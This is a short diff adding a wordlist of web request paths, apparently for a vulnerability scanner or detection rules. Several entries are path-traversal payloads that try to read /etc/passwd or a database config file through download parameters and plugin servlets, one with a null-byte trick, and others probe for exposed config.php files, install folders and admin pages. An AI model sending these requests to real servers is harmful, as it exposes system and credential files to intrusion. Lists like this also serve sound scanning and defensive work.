@@ -1,0 +1,14 @@
+/downlot.php?file=../../../../../../../../../../etc/passwd
+/index.php?download=/etc/passwd
+/index.php?page_slug=../../../../../etc/passwd%00
+/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
+
+/config.php
+/config/config.php
+/include/config.php
+/includes/config.php
+/install/
+/ccm/system/panels/page/preview_as_user/preview?cID=
+/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName
+/v12/setup/temp/admin.php
